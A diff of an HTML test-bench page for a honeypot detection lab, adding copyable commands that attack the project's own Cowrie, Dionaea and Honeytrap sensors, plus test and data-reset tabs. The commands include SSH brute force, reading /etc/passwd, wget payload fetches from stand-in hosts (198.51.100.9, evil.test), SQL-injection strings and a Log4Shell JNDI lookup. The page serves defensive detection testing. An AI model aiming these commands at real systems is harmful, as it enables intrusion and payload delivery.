@@ -1,176 +1,244 @@
 <!--
-  Page test bench: appended to the /health page by health_page.py.
+  Page test bench: appended to the /health page by health_page.py, which also
+  holds the shared styles, the tab bar and the sign-in controls in the header.
   Every button drives the REAL backend: real honeypot traffic, real DB rows,
   real Splunk indexing, real ClamAV, real PDF render. Nothing is mocked.
   /health is served from the backend origin (:8000), so the frontend's
-  localStorage token isn't visible here: sign in below. All role checks stay
-  server-side; this page only keeps the token in sessionStorage.
+  localStorage token isn't visible here: sign in from the header. All role checks
+  stay server-side; this page only keeps the token in sessionStorage.
 -->
 <style>
-  #tb { max-width: 1240px; }
-  #tb .bar { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-bottom: 14px; }
-  #tb input { background: #161512; border: 1px solid #3e3b34; color: #f3f0e9; border-radius: 5px;
-              padding: 5px 8px; font: inherit; font-size: 12px; min-width: 0; }
-  #tb button { background: #23221e; color: #d2ccc0; border: 1px solid #3e3b34; border-radius: 5px;
-               padding: 5px 12px; font: inherit; font-size: 12px; cursor: pointer; }
-  #tb button:hover:not(:disabled) { background: #3e3b34; }
-  #tb button:disabled { opacity: .5; cursor: progress; }
-  #tb button.go { color: #8e9cff; border-color: #2a3fd1; }
-  #tb button.heavy { color: #e2ac4a; border-color: #6b4f12; }
-  #tb .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(min(100%, 380px), 1fr)); gap: 12px; }
-  #tb .tc { background: #161512; border: 1px solid #2c2a25; border-radius: 8px; padding: 12px 14px;
-            display: flex; flex-direction: column; min-width: 0; }
-  #tb .tc h3 { margin: 0; font-size: 13px; color: #f3f0e9; display: flex; justify-content: space-between; gap: 8px; }
-  #tb .tc .pages { font-size: 11px; margin: 2px 0 6px; }
-  #tb .tc .pages a { margin-right: 8px; }
-  #tb .tc .why { font-size: 12px; color: #a8a294; margin-bottom: 4px; }
-  #tb .tc .what { font-size: 11px; color: #868073; margin-bottom: 10px; }
-  #tb .tc .btns { display: flex; flex-wrap: wrap; gap: 6px; margin-top: auto; }
-  #tb .log { margin-top: 10px; font-size: 12px; max-height: 300px; overflow: auto; }
-  #tb .log:empty { display: none; }
-  #tb .st { display: grid; grid-template-columns: 40px 1fr auto; gap: 2px 8px; padding: 4px 0; border-top: 1px solid #1a1916; }
-  #tb .st .d { grid-column: 2 / 4; color: #868073; white-space: pre-wrap; word-break: break-word; font-size: 11px; }
-  #tb .st .d:empty { display: none; }
-  #tb .ms { color: #868073; font-size: 11px; }
-  #tb .PASS { color: #5bbf86; } #tb .FAIL { color: #f07468; } #tb .RUN { color: #8e9cff; } #tb .SKIP { color: #e2ac4a; }
-  #tb .badge { font-size: 11px; padding: 0 6px; border-radius: 4px; border: 1px solid currentColor; white-space: nowrap; }
-  #tb .data { background: #161512; border: 1px solid #2c2a25; border-radius: 8px; padding: 12px 14px; margin-bottom: 14px; }
-  #tb .data .row { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-top: 8px; }
-  #tb select { background: #161512; border: 1px solid #3e3b34; color: #f3f0e9; border-radius: 5px; padding: 4px 6px; font: inherit; font-size: 12px; }
-  #tb button.danger { color: #f07468; border-color: #6e2c26; }
-  #tb pre.joblog { margin: 10px 0 0; max-height: 220px; overflow: auto; font-size: 11px; color: #a8a294; white-space: pre-wrap; }
-  #tb pre.joblog:empty { display: none; }
-  #tb .term { background: #161512; border: 1px solid #2c2a25; border-radius: 8px; padding: 12px 14px; margin-bottom: 14px; }
-  #tb .term .term-note { font-size: 12px; color: #a8a294; margin: 0 0 10px; }
-  #tb .term-item { border-top: 1px solid #1a1916; padding: 10px 0; }
-  #tb .term-item:first-of-type { border-top: none; padding-top: 4px; }
-  #tb .term-head { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; margin-bottom: 6px; }
-  #tb .term-head b { font-size: 12.5px; color: #f3f0e9; font-weight: 600; }
-  #tb .term-tag { font-size: 10.5px; padding: 1px 7px; border-radius: 10px; border: 1px solid currentColor; white-space: nowrap; font-weight: 600; letter-spacing: .2px; }
-  #tb .term-tag.cred { color: #8e9cff; }
-  #tb .term-tag.other { color: #868073; }
-  #tb .term-desc { font-size: 11.5px; color: #868073; margin: 0 0 6px; }
-  #tb .term-block { position: relative; background: #12110f; border: 1px solid #23221e; border-radius: 6px; }
-  #tb .term-block pre { margin: 0; padding: 10px 70px 10px 12px; white-space: pre-wrap; word-break: break-word;
-                         font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; color: #aab4ff; line-height: 1.55; }
-  #tb .term-block .term-cp { position: absolute; top: 7px; right: 7px; background: #23221e; color: #d2ccc0; border: 1px solid #3e3b34;
-                              border-radius: 5px; padding: 2px 9px; font-size: 11px; cursor: pointer; }
-  #tb .term-block .term-cp:hover { background: #3e3b34; }
-  #tb .term-block .term-cp.ok { color: #5bbf86; border-color: #1d7448; }
-  #tb .term-result { font-size: 11px; color: #77726a; margin-top: 5px; }
-  #tb .term-creds { width: 100%; border-collapse: collapse; font-size: 11.5px; margin: 8px 0 4px; }
-  #tb .term-creds th, #tb .term-creds td { text-align: left; padding: 4px 10px 4px 0; border-top: 1px solid #1a1916; }
-  #tb .term-creds th { color: #868073; font-weight: 600; }
-  #tb .term-creds td.ok { color: #5bbf86; } #tb .term-creds td.no { color: #f07468; }
+  /* expandable rows, shared by the command list and the test list */
+  .acc { border-top: 1px solid var(--border); }
+  .acc:first-child { border-top: 0; }
+  .acc > summary { display: grid; gap: 16px; align-items: center; min-height: 56px; padding: 8px 20px;
+                   cursor: pointer; list-style: none; transition: background 150ms var(--ease); }
+  .acc > summary::-webkit-details-marker { display: none; }
+  .acc > summary:hover { background: var(--surface-2); }
+  .acc > summary::before { content: ""; width: 6px; height: 6px; margin-left: 2px; border-right: 1.5px solid var(--faint);
+                           border-bottom: 1.5px solid var(--faint); transform: rotate(-45deg); transition: transform 250ms var(--ease); }
+  .acc[open] > summary::before { transform: rotate(45deg); }
+  .acc-b { padding: 4px 20px 20px 52px; display: grid; gap: 12px; }
+  .acc-b p { color: var(--muted); font-size: 13px; max-width: 860px; }
+  .acc-b p b { color: var(--text-2); font-weight: 500; }
+
+  /* attack commands */
+  .cmd > summary { grid-template-columns: 16px minmax(0, 1fr) auto; }
+  .cmd > summary b { font-weight: 500; }
+  .cmd > summary span { font-size: 13px; color: var(--faint); white-space: nowrap; }
+  .cmd > summary span.cred { color: var(--accent); }
+  .code { position: relative; background: var(--navy); border-radius: 6px; }
+  .code pre { margin: 0; padding: 16px 96px 16px 16px; white-space: pre-wrap; word-break: break-word;
+              font-size: 12.5px; line-height: 1.6; color: #e8e9ff; }
+  .code .term-cp { position: absolute; top: 12px; right: 12px; height: 28px; background: transparent;
+                   color: #d6d9fc; border-color: rgba(214, 217, 252, .35); }
+  .code .term-cp:hover { border-color: #d6d9fc; }
+  .code .term-cp.ok { color: #6ee7a8; border-color: #6ee7a8; }
+  .logins { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); border-top: 1px solid var(--border); }
+  .logins > div { padding: 16px 20px; border-left: 1px solid var(--border); }
+  .logins > div:first-child { border-left: 0; }
+  .logins ul { margin: 8px 0 0; padding: 0; list-style: none; font: 13px/1.9 var(--mono); color: var(--text-2); }
+  .logins li span { color: var(--faint); font-family: var(--font); }
+
+  /* page tests */
+  .toolbar { display: flex; flex-wrap: wrap; align-items: center; gap: 12px; margin-bottom: 20px; }
+  .toolbar .sum { margin-left: auto; font-size: 13px; color: var(--muted); }
+  .tc > summary { grid-template-columns: 16px minmax(0, 1fr) 190px 64px; }
+  .tc-t b { display: block; font-weight: 500; }
+  .tc-t span { display: block; font-size: 13px; color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .state { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--faint); white-space: nowrap; }
+  .state::before { content: ""; width: 8px; height: 8px; border-radius: 50%; background: var(--border-strong); }
+  .state.PASS::before { background: var(--success-solid); } .state.FAIL::before { background: var(--danger-solid); }
+  .state.RUN::before { background: var(--accent); animation: pulse 1s ease-in-out infinite; }
+  @keyframes pulse { 50% { opacity: .25; } }
+  .PASS { color: var(--success); } .FAIL { color: var(--danger); } .RUN { color: var(--accent); } .SKIP { color: var(--warning); }
+  .pages a { margin-right: 12px; font-size: 13px; }
+  .log { padding: 0 16px; max-height: 320px; overflow: auto; background: var(--surface-2);
+         border: 1px solid var(--border); border-radius: 6px; }
+  .log:empty { display: none; }
+  .st { display: grid; grid-template-columns: 44px minmax(0, 1fr) auto; gap: 2px 12px; padding: 8px 0;
+        border-top: 1px solid var(--border); font-size: 13px; }
+  .st:first-child { border-top: 0; }
+  .st > :first-child { font: 600 11px/20px var(--mono); }
+  .st .ms { color: var(--faint); font-size: 12px; font-variant-numeric: tabular-nums; }
+  .st .d { grid-column: 2 / 4; color: var(--muted); white-space: pre-wrap; word-break: break-word; font: 12px/1.6 var(--mono); }
+  .st .d:empty { display: none; }
+
+  /* project data */
+  .form { padding: 4px 20px 20px; display: grid; gap: 16px; align-content: start; }
+  .form p { color: var(--muted); font-size: 13px; }
+  .form p b { color: var(--text-2); font-weight: 500; }
+  .fields { display: flex; flex-wrap: wrap; align-items: end; gap: 12px; }
+  .fields label { display: grid; gap: 4px; font-size: 12px; font-weight: 500; color: var(--muted); }
+  .joblog { margin: 0; padding: 16px 20px; max-height: 280px; overflow: auto; border-top: 1px solid var(--border);
+            background: var(--surface-2); font-size: 12px; line-height: 1.6; color: var(--text-2); white-space: pre-wrap; }
+
+  @media (max-width: 900px) {
+    .tc > summary { grid-template-columns: 16px minmax(0, 1fr) 64px; }
+    .tc > summary .state { grid-column: 2; grid-row: 2; }
+    .cmd > summary span { display: none; }
+    .acc-b { padding-left: 20px; }
+    .logins { grid-template-columns: 1fr; }
+    .logins > div { border-left: 0; border-top: 1px solid var(--border); }
+  }
 </style>
 
-<h2>Page test bench <span class="note">(each button hits the live backend: real traffic, real rows, real engines)</span></h2>
-<div id="tb">
-  <div class="bar">
-    <span id="tbWho" class="note">not signed in</span>
-    <input id="tbEmail" placeholder="email" autocomplete="username">
-    <input id="tbPass" type="password" placeholder="password" autocomplete="current-password">
-    <button id="tbLogin">sign in</button>
-    <button id="tbBypass">dev bypass</button>
-    <button id="tbLogout">sign out</button>
-    <span style="flex:1"></span>
-    <button id="tbAll" class="go">run all (skips heavy)</button>
-    <span id="tbSum" class="note"></span>
+<section class="tab" id="tab-commands">
+  <h1>Attack commands <span>drive the platform, don't just poke the honeypots.</span></h1>
+  <p class="lede">Each command launches a real attacker in a throwaway container on the lab network, so it needs nothing on your Mac but Docker, never stops at a password prompt, and is a single safe paste. Every attack is captured by a sensor, run through the detection rules, correlated into a graded case and mapped to MITRE — watch it happen on the pages named under each one.</p>
+
+  <div class="panel" style="border-left:2px solid var(--accent)">
+    <div class="panel-h">Guided walkthrough <span>one command, the whole story — best for a demo or viva</span></div>
+    <div class="acc-b" style="padding-top:4px">
+      <p>Runs all five stages below in order and narrates what to open at each step: recon → brute force → breach → service &amp; web attacks → malware triage. It reads the result back out of the database at the end, so nothing on screen is a canned claim.</p>
+      <div class="code"><button class="btn term-cp">Copy</button><pre>./scripts/demo.sh</pre></div>
+      <p class="note">Run it from the project folder. Add <code>--fast</code> to skip the pauses. First run builds the attacker image (needs internet once).</p>
+    </div>
   </div>
-  <div class="data">
-    <h3 style="margin:0;font-size:13px;color:#f3f0e9">Project data <span id="dInv" class="note"></span></h3>
-    <div class="row">
-      <span class="note">populate:</span>
-      <label class="note">historic corpus
-        <select id="dCorpus"><option value="0">none</option><option value="10000">10k events</option><option value="20000" selected>20k events</option><option value="45000">45k events</option></select></label>
-      <label class="note">live attack waves
-        <select id="dWaves"><option>0</option><option selected>1</option><option>2</option><option>3</option></select></label>
-      <button id="dPopulate" class="go">populate data</button>
+
+  <p class="note" style="margin:4px 0 -6px">Or fire a single stage yourself:</p>
+  <div class="panel">
+    <details class="acc cmd" open>
+      <summary><b>1. Reconnaissance — port / service scan</b><span>Dionaea · MITRE T1046</span></summary>
+      <div class="acc-b">
+        <p>One source touches many distinct service ports in seconds. The engine counts distinct ports (not packets) and raises <code>st-recon-006</code> (MEDIUM).</p>
+        <div class="code"><button class="btn term-cp">Copy</button><pre>docker run --rm --network honeynet_edge st-attacker:latest 'for p in 21 80 135 443 445 1433 3306 5060 27017; do nc -z -w1 honeynet_dionaea $p; done'</pre></div>
+        <p><b>See:</b> Event Log (a burst from one new IP) · MITRE ATT&amp;CK (Discovery lights up).</p>
+      </div>
+    </details>
+
+    <details class="acc cmd">
+      <summary><b>2. Brute force, then a breach</b><span class="cred">Cowrie SSH · the full kill chain → CRITICAL</span></summary>
+      <div class="acc-b">
+        <p>Five wrong passwords for <code>root</code>, then the one Cowrie accepts (<code>hunter2</code>), then hands-on-keyboard commands and a payload download. Fires <code>st-auth-001</code> + <code>st-cred-002</code> (CRITICAL) + <code>st-exec-003</code> + <code>st-exec-004</code>, all correlated into one CRITICAL case.</p>
+        <div class="code"><button class="btn term-cp">Copy</button><pre>docker run --rm --network honeynet_edge st-attacker:latest 'for pw in 123456 password root toor admin; do sshpass -p $pw ssh -p 2222 root@honeynet_cowrie true 2>/dev/null; done; sshpass -p hunter2 ssh -p 2222 root@honeynet_cowrie "whoami; id; uname -a; cat /etc/passwd; wget http://198.51.100.9/bot.sh; exit"'</pre></div>
+        <p><b>See:</b> Investigations (new CRITICAL case: timeline + the four rules under "why this severity") · Credential Vault (root / hunter2 + the 5 rejected) · Behaviour Profiling.</p>
+      </div>
+    </details>
+
+    <details class="acc cmd">
+      <summary><b>3. Service credential theft</b><span class="cred">Dionaea · FTP + MySQL</span></summary>
+      <div class="acc-b">
+        <p>Captures credentials on services other than SSH — proof the vault is multi-protocol. Raises <code>st-cred-003</code> (MEDIUM) per service.</p>
+        <div class="code"><button class="btn term-cp">Copy</button><pre>docker run --rm --network honeynet_edge st-attacker:latest 'curl -s -m6 --user oracle:oracle123 ftp://honeynet_dionaea:21/ >/dev/null; mariadb -h honeynet_dionaea -u root -ptoor123 --ssl=0 --connect-timeout=6 -e "show databases" 2>/dev/null; echo done'</pre></div>
+        <p><b>See:</b> Credential Vault — FTP and MYSQL rows alongside SSH.</p>
+      </div>
+    </details>
+
+    <details class="acc cmd">
+      <summary><b>4. Web application attack</b><span>Honeytrap · MITRE T1190</span></summary>
+      <div class="acc-b">
+        <p>SQL-injection and Log4Shell (JNDI) payloads in the request and user agent. Raises <code>st-web-002</code> (HIGH).</p>
+        <div class="code"><button class="btn term-cp">Copy</button><pre>docker run --rm --network honeynet_edge st-attacker:latest 'curl -s -m5 "http://honeynet_honeytrap:8022/?id=1%27%20OR%20%271%27=%271" -A "sqlmap/1.7"; curl -s -m5 "http://honeynet_honeytrap:8022/" -A "jndi:ldap://198.51.100.9/a"; echo done'</pre></div>
+        <p><b>See:</b> Event Log (Honeytrap HTTP with the injection strings) · MITRE ATT&amp;CK (Initial Access T1190).</p>
+      </div>
+    </details>
+
+    <details class="acc cmd">
+      <summary><b>5. Full sweep — all three sensors at once</b><span>smoke test</span></summary>
+      <div class="acc-b">
+        <p>One recon pass across every sensor. Quick confirmation the whole capture path is alive.</p>
+        <div class="code"><button class="btn term-cp">Copy</button><pre>docker run --rm --network honeynet_edge st-attacker:latest 'for t in honeynet_cowrie:2222 honeynet_cowrie:2223 honeynet_dionaea:445 honeynet_dionaea:21 honeynet_dionaea:1433 honeynet_honeytrap:8022 honeynet_honeytrap:8023; do nc -z -w1 ${t%:*} ${t#*:} && echo up $t; done'</pre></div>
+        <p><b>See:</b> Event Log — a connect event on every sensor.</p>
+      </div>
+    </details>
+  </div>
+
+  <details class="acc cmd" style="border:1px solid var(--border);border-radius:6px;margin-bottom:20px">
+    <summary><b>Prefer to attack from your Mac directly?</b><span>no container</span></summary>
+    <div class="acc-b">
+      <p>The stack also publishes every sensor on <code>localhost</code>, so you can attack from a normal Terminal. The container commands above are preferred for a demo (one paste, nothing to install, never hangs on a password), but a live SSH makes a nice "real attacker" moment:</p>
+      <div class="code"><button class="btn term-cp">Copy</button><pre>ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null oracle@localhost</pre></div>
+      <p class="note">Password is <code>oracle</code> (Cowrie accepts it). Once in, type: <code>whoami; id; cat /etc/passwd; wget http://198.51.100.9/x; exit</code>. Run these as separate lines, not pasted with the comment text.</p>
     </div>
-    <div class="row">
-      <span class="note">reset:</span>
-      <input id="dConfirm" placeholder="type RESET" size="11">
-      <button id="dReset" class="danger">reset data</button>
-      <span class="note">wipes events, detections, incidents, evidence, reports, malware scans, sensor logs: keeps accounts, roles, access/audit logs, settings, nodes, VM labs, Splunk</span>
+  </details>
+
+  <div class="panel">
+    <div class="panel-h">Logins Cowrie is configured with <span><code>sensors/cowrie/userdb.txt</code>. Anything not listed under root or admin also succeeds.</span></div>
+    <div class="logins">
+      <div>
+        <span class="stat good">Accepted</span>
+        <ul>
+          <li>oracle / oracle</li>
+          <li>ubuntu / ubuntu</li>
+          <li>root / <span>anything else, for example</span> hunter2 <span>or</span> toor</li>
+          <li>admin / <span>anything else</span></li>
+        </ul>
+      </div>
+      <div>
+        <span class="stat bad">Rejected</span>
+        <ul>
+          <li>root / root</li>
+          <li>root / 123456</li>
+          <li>root / password</li>
+          <li>root / admin</li>
+          <li>admin / admin</li>
+          <li>admin / 123456</li>
+        </ul>
+      </div>
     </div>
+  </div>
+</section>
+
+<section class="tab" id="tab-tests">
+  <h1>Page tests <span>one for each console page.</span></h1>
+  <p class="lede">Each test drives the live backend: real honeypot traffic, real database rows, real Splunk indexing, real ClamAV, real PDF rendering. Nothing is mocked. Open a row to see what it does and its step log.</p>
+  <p class="need-auth">Sign in from the top right to run tests. Role checks stay on the server.</p>
+  <div class="toolbar">
+    <button id="tbAll" class="btn btn-primary">Run all</button>
+    <span class="note">Runs in order and skips the two tests that boot a container.</span>
+    <span id="tbSum" class="sum"></span>
+  </div>
+  <div class="panel" id="tbCards"></div>
+</section>
+
+<section class="tab" id="tab-data">
+  <h1>Project data <span>fill the lab or wipe it.</span></h1>
+  <p class="lede">Populate drives real traffic at the honeypots and loads a historic corpus. Reset empties what the platform has collected. Both need an admin sign-in.</p>
+  <p class="need-auth">Sign in from the top right as an admin to see the inventory and use these controls.</p>
+  <p id="dErr" class="alert" hidden></p>
+
+  <div class="kpis" style="--n: 6">
+    <div><span class="k">Data rows</span><span class="v" id="dRows">n/a</span></div>
+    <div><span class="k">Events</span><span class="v" id="dEvents">n/a</span></div>
+    <div><span class="k">Detections</span><span class="v" id="dDet">n/a</span></div>
+    <div><span class="k">Incidents</span><span class="v" id="dInc">n/a</span></div>
+    <div><span class="k">Reports</span><span class="v" id="dRep">n/a</span></div>
+    <div><span class="k">Sensor logs</span><span class="v" id="dLogs">n/a</span></div>
+  </div>
+
+  <div class="grid2">
+    <div class="panel">
+      <div class="panel-h">Populate</div>
+      <div class="form">
+        <p>Loads a historic corpus of geolocatable events, then runs live attack waves from the attacker container against the sensors.</p>
+        <div class="fields">
+          <label>Historic corpus
+            <select id="dCorpus"><option value="0">None</option><option value="10000">10k events</option><option value="20000" selected>20k events</option><option value="45000">45k events</option></select></label>
+          <label>Live attack waves
+            <select id="dWaves"><option>0</option><option selected>1</option><option>2</option><option>3</option></select></label>
+          <button id="dPopulate" class="btn btn-primary">Populate data</button>
+        </div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-h">Reset</div>
+      <div class="form">
+        <p><b>Wipes</b> events, detections, incidents, evidence, reports, malware scans and sensor logs. <b>Keeps</b> accounts, roles, access and audit logs, settings, nodes, VM labs and Splunk.</p>
+        <div class="fields">
+          <label>Type RESET to confirm
+            <input id="dConfirm" placeholder="RESET" size="12" autocomplete="off"></label>
+          <button id="dReset" class="btn btn-danger">Reset data</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel" id="dJobPanel" hidden>
+    <div class="panel-h">Job log</div>
     <pre id="dLog" class="joblog"></pre>
   </div>
-
-  <div class="term">
-    <h3 style="margin:0 0 6px;font-size:13px;color:#f3f0e9">Terminal commands: trigger the honeypots from your Mac</h3>
-    <p class="term-note">Paste into a normal macOS Terminal (not inside Docker): the stack publishes each sensor's port straight to <code>localhost</code>, so these hit the real Cowrie/Dionaea/Honeytrap containers over the network exactly like a real attacker would. No login on this page needed for these; each command is verified working as written. <b>Every attempt is really captured</b>: it lands in Event Log within a few seconds and in the Credentials Vault too, for the SSH ones.</p>
-
-    <div class="term-item">
-      <div class="term-head"><b>1. SSH login: real session</b><span class="term-tag cred">→ SSH CREDENTIAL CAPTURE</span></div>
-      <p class="term-desc">Logs in with a real username/password Cowrie accepts, then runs commands inside the fake shell. The username + password you type is captured and shows up in the Credentials Vault page as a real entry: this is the one to use if you want a credential to show up.</p>
-      <div class="term-block"><button class="term-cp">copy</button><pre>ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null oracle@localhost
-# password: oracle   (Cowrie will accept it)
-# once you're in, try:
-whoami; id; uname -a; cat /etc/passwd; wget http://evil.test/x; ls -la /tmp; exit</pre></div>
-      <div class="term-result">Captures: <code>oracle</code> / <code>oracle</code> in the vault, a full command session in Event Log, and (if you run the wget line) a payload-download detection.</div>
-    </div>
-
-    <div class="term-item">
-      <div class="term-head"><b>2. SSH brute force → then a successful login</b><span class="term-tag cred">→ SSH CREDENTIAL CAPTURE (×5)</span></div>
-      <p class="term-desc">4 rejected passwords for <code>root</code>, then a 5th that's accepted (<code>hunter2</code>): the exact fail-then-succeed shape the <code>st-cred-002</code> brute-force detection looks for. All 5 attempts are captured as separate credential rows, the 4 failed ones marked as rejected. Needs <code>sshpass</code> (<code>brew install hudochenkov/sshpass/sshpass</code>) so it doesn't stop and ask you for a password 5 times.</p>
-      <div class="term-block"><button class="term-cp">copy</button><pre>for pw in 123456 password root toor; do
-  sshpass -p "$pw" ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
-    -o ConnectTimeout=4 root@localhost exit 2>/dev/null
-done
-sshpass -p hunter2 ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
-  root@localhost "id; whoami; exit"</pre></div>
-      <div class="term-result">Captures: <code>root</code> / <code>123456</code>, <code>password</code>, <code>root</code>, <code>toor</code> (all rejected) then <code>root</code> / <code>hunter2</code> (accepted): 5 rows in Credentials Vault, plus a CRITICAL brute-force incident.</div>
-    </div>
-
-    <div class="term-item">
-      <div class="term-head"><b>3. Telnet connect</b><span class="term-tag other">→ Cowrie Telnet</span></div>
-      <p class="term-desc">Just a TCP connect: no login prompt is answered, so nothing lands in the credential vault. Confirms the Telnet listener is alive.</p>
-      <div class="term-block"><button class="term-cp">copy</button><pre>nc -zv localhost 2223   # or: telnet localhost 2223</pre></div>
-      <div class="term-result">Captures: a Cowrie connect event in Event Log. No credential (you didn't send one).</div>
-    </div>
-
-    <div class="term-item">
-      <div class="term-head"><b>4. Dionaea: SMB / anonymous FTP / MSSQL</b><span class="term-tag other">→ Dionaea</span></div>
-      <p class="term-desc">Touches all three Dionaea ports. The FTP line logs in as <code>anonymous</code>: captured as an FTP credential, though it's not a secret since anonymous FTP is meant to be public.</p>
-      <div class="term-block"><button class="term-cp">copy</button><pre>nc -zv -w2 localhost 445
-curl -s -m3 "ftp://anonymous:test@localhost:2121/"
-nc -zv -w2 localhost 1433</pre></div>
-      <div class="term-result">Captures: SMB + MSSQL connect events, one anonymous FTP credential row.</div>
-    </div>
-
-    <div class="term-item">
-      <div class="term-head"><b>5. Honeytrap: HTTP request + SQL-injection-shaped request</b><span class="term-tag other">→ Honeytrap</span></div>
-      <p class="term-desc">A plain GET, then a request with a classic <code>' OR '1'='1</code> payload in the query string. Honeytrap doesn't speak full HTTP back, so curl may print a connection error on the second line: that's expected, the request still reaches the sensor and gets logged.</p>
-      <div class="term-block"><button class="term-cp">copy</button><pre>curl -s -m4 "http://localhost:8022/"
-curl -s -m4 "http://localhost:8023/?id=1%27%20OR%20%271%27=%271"</pre></div>
-      <div class="term-result">Captures: two Honeytrap events in Event Log. No credential: this port doesn't do logins.</div>
-    </div>
-
-    <div class="term-item">
-      <div class="term-head"><b>6. Full port sweep: every sensor at once</b><span class="term-tag other">→ all sensors</span></div>
-      <p class="term-desc">One-liner reconnaissance scan across every published honeypot port. Good smoke test that the whole stack is up.</p>
-      <div class="term-block"><button class="term-cp">copy</button><pre>for p in 2222 2223 445 2121 1433 8022 8023; do nc -zv -w1 localhost $p; done</pre></div>
-      <div class="term-result">Captures: a connect event per sensor. No credential.</div>
-    </div>
-
-    <p style="font-size:11.5px;color:#868073;margin:10px 0 6px">Full credential table Cowrie is configured with (<code>sensors/cowrie/userdb.txt</code>): anything not listed under root/admin also succeeds:</p>
-    <table class="term-creds">
-      <tr><th>username</th><th>password</th><th>result</th></tr>
-      <tr><td>root</td><td>root</td><td class="no">✕ rejected</td></tr>
-      <tr><td>root</td><td>123456</td><td class="no">✕ rejected</td></tr>
-      <tr><td>root</td><td>password</td><td class="no">✕ rejected</td></tr>
-      <tr><td>root</td><td>admin</td><td class="no">✕ rejected</td></tr>
-      <tr><td>admin</td><td>admin</td><td class="no">✕ rejected</td></tr>
-      <tr><td>admin</td><td>123456</td><td class="no">✕ rejected</td></tr>
-      <tr><td>root</td><td>anything else (e.g. <code>hunter2</code>, <code>toor</code>)</td><td class="ok">✓ accepted</td></tr>
-      <tr><td>admin</td><td>anything else</td><td class="ok">✓ accepted</td></tr>
-      <tr><td>oracle</td><td>oracle</td><td class="ok">✓ accepted</td></tr>
-      <tr><td>ubuntu</td><td>ubuntu</td><td class="ok">✓ accepted</td></tr>
-    </table>
-  </div>
-
-  <div id="tbCards" class="cards"></div>
-</div>
+</section>
 
 <script>
 (() => {
@@ -782,116 +850,144 @@ const TESTS = [
 
 // ── Render ──────────────────────────────────────────────────────────────
 const cards = document.getElementById('tbCards');
+const idle = (t) => t.heavy ? 'Boots a container' : 'Not run';
 cards.innerHTML = TESTS.map(t => `
-  <div class="tc" id="tc-${t.id}">
-    <h3><span>${h(t.title)}</span><span class="badge" id="bd-${t.id}" hidden></span></h3>
-    <div class="pages">${t.pages.map(p => `<a href="${FRONT}${p}" target="_blank" rel="noopener">${h(p)}</a>`).join('')}</div>
-    <div class="why">${h(t.why)}</div>
-    <div class="what">${h(t.what)}</div>
-    <div class="btns"><button class="${t.heavy ? 'heavy' : 'go'}" data-id="${t.id}">${t.heavy ? 'run (boots container)' : 'run test'}</button></div>
-    <div class="log" id="lg-${t.id}"></div>
-  </div>`).join('');
+  <details class="acc tc" id="tc-${t.id}">
+    <summary>
+      <span class="tc-t"><b>${h(t.title)}</b><span>${h(t.why)}</span></span>
+      <span class="state" id="bd-${t.id}">${idle(t)}</span>
+      <button class="btn" data-id="${t.id}">Run</button>
+    </summary>
+    <div class="acc-b">
+      <p><b>What it does:</b> ${h(t.what)}</p>
+      <p class="pages"><b>Pages:</b> ${t.pages.map(p => `<a href="${FRONT}${p}" target="_blank" rel="noopener">${h(p)}</a>`).join('')}</p>
+      <div class="log" id="lg-${t.id}"></div>
+    </div>
+  </details>`).join('');
 
 const running = new Set();
 async function runTest(t) {
   if (running.has(t.id)) return;
   const btn = cards.querySelector(`button[data-id="${t.id}"]`), bd = document.getElementById('bd-' + t.id);
-  if (!TOKEN) { bd.hidden = false; bd.className = 'badge FAIL'; bd.textContent = 'sign in first'; return; }
+  if (!TOKEN) { bd.className = 'state FAIL'; bd.textContent = 'Sign in first'; return; }
   running.add(t.id); btn.disabled = true;
-  bd.hidden = false; bd.className = 'badge RUN'; bd.textContent = 'running';
+  bd.className = 'state RUN'; bd.textContent = 'Running';
   const R = new Run(document.getElementById('lg-' + t.id));
   const t0 = performance.now();
   try { await t.run(R); } catch (e) { R.fails++; R.row('FAIL', 'test crashed').querySelector('.d').textContent = e.message; }
   const secs = ((performance.now() - t0) / 1000).toFixed(1);
-  bd.className = 'badge ' + (R.fails ? 'FAIL' : 'PASS');
-  bd.textContent = `${R.fails ? 'FAIL' : 'PASS'} ${R.passes}/${R.passes + R.fails} · ${secs}s`;
+  bd.className = 'state ' + (R.fails ? 'FAIL' : 'PASS');
+  bd.textContent = `${R.fails ? 'Fail' : 'Pass'} ${R.passes}/${R.passes + R.fails} · ${secs}s`;
+  if (R.fails) document.getElementById('tc-' + t.id).open = true;  // a failure shows its log without a click
   running.delete(t.id); btn.disabled = false;
   return !R.fails;
 }
-cards.addEventListener('click', e => { const b = e.target.closest('button[data-id]'); if (b) runTest(TESTS.find(t => t.id === b.dataset.id)); });
+cards.addEventListener('click', e => {
+  const b = e.target.closest('button[data-id]');
+  if (!b) return;
+  e.preventDefault();  // the button sits in a <summary>: run the test instead of toggling the row
+  if (TOKEN) b.closest('details').open = true;
+  runTest(TESTS.find(t => t.id === b.dataset.id));
+});
 
 document.getElementById('tbAll').onclick = async (e) => {
-  e.target.disabled = true;
   const sum = document.getElementById('tbSum');
+  if (!TOKEN) { sum.innerHTML = '<span class="FAIL">Sign in first</span>'; return; }
+  e.target.disabled = true;
   let pass = 0, fail = 0;
   // sequential: tests share the sensors and time-window assertions
   for (const t of TESTS.filter(t => !t.heavy)) {
-    sum.textContent = `running ${t.title}…`;
+    sum.textContent = `Running ${t.title}`;
     (await runTest(t)) ? pass++ : fail++;
   }
-  sum.innerHTML = `<span class="PASS">${pass} passed</span> · <span class="${fail ? 'FAIL' : 'PASS'}">${fail} failed</span> · heavy tests skipped`;
+  sum.innerHTML = `<span class="PASS">${pass} passed</span> · <span class="${fail ? 'FAIL' : 'PASS'}">${fail} failed</span> · ${TESTS.filter(t => t.heavy).length} skipped`;
